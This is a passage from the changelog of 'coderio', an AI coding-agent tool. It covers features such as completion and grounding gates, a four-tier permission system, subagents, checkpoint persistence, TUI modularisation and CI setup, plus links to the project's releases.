  (`loop.py`) entirely. deepagents provides context management (offload +
  summarization), a filesystem/shell backend with `virtual_mode` path
  isolation, subagents (task tool), and task planning. coderio's harness four
  gates and four-tier permission system are mounted as middleware.
- **Harness four gates** as `HarnessMiddleware`: VerifyGate (block "done" when
  code was written but never run), CompletionGate (block when todos are
  incomplete), GroundingGate (CODE-mode-only, catches fabricated file
  citations), PlanGate (soft nudge to create a todo list). Escalation after
  `_MAX_GATE_ATTEMPTS=2` interceptions: release with a loud warning, never
  silent, never infinite.
- **Four-tier permission system**: PLAN / CONFIRM / AUTO_EDIT / FULL. Removed
  the old `WorkspacePolicy` (couldn't handle deepagents virtual paths). The
  TUI uses a vertical confirmation menu (↑↓ + Enter, zcode/codex style) with
  Agree / Deny / Other options.
- **Research subagent** (read-only, physically isolated via
  `_ToolExclusionMiddleware`) + general-purpose (full tools). Main agent
  delegates via the `task` tool with context isolation.
- **SQLite checkpoint persistence** for graph state, with three-layer
  try/except connection management.
- **Three stream modes**: messages (token-by-token), updates (complete
  messages), custom (harness signals).
- **Dynamic TODO widget** (Claude Code style — updates in place, not
  remounted). Collapsible panel with ✓/→/○ real-time progress.
- **Textual TUI modularization**: split `tui.py` (~2700 lines) into 4 modules
  (`tui.py` ~1532 + `tui_onboarding.py` + `tui_screens.py` + `tui_widgets.py`).
- **Onboarding wizard** with context-window auto-detection (`llm/probe.py`).
- **Session management**: `/resume` picker with Del-key deletion (double-Del
  confirmation, active-session protection).
- **Internal Web search tool** (free) + Web fetch. Users can install
  Lion-Skills extensions for advanced capabilities.
- **CI**: 3 OS × 2 Python matrix, `pip check`, `pip-audit`
  (continue-on-error), wheel build smoke test, Dependabot (pip +
  github-actions).
- **Performance baseline tests** (real model calls, opt-in via
  `CODERIO_PERF_TESTS=1`).

### Changed
- Permission mode `"auto"` (legacy) silently maps to FULL via `normalize()`.
- `BASE_AGENT_PROMPT` neutralized via `_deepagents_compat.py` — coderio's
  system prompt is sole.
- `execute` path rules in system prompt: relative paths for shell, virtual
  paths for file tools (fixed 16-tool-call confusion for simple write tasks).

### Removed
- ReAct engine (`loop.py`, `compact.py`), `workspace.py`, crew orchestration
  package, and all references.

## [0.1.0] — 2026-07-21

### Added
- Initial release: skill-driven coding agent with langchain + deepagents.
- 12 tools (read 4 + write 3 + execute + plan + web 2 + memory).
- Three-layer skill store (bundled < user < project).
- 7 providers (智谱/阶跃 coding plan + API, OpenAI, Anthropic, Ollama, custom).
- Rich stream UI + Textual TUI with foldable thinking.
- jsonl session persistence with compression truncation.

[Unreleased]: https://github.com/Lion-1209/coderio/compare/v0.3.0...HEAD
[0.3.0]: https://github.com/Lion-1209/coderio/releases/tag/v0.3.0
[0.2.0]: https://github.com/Lion-1209/coderio/releases/tag/v0.2.0
[0.1.0]: https://github.com/Lion-1209/coderio/releases/tag/v0.1.0
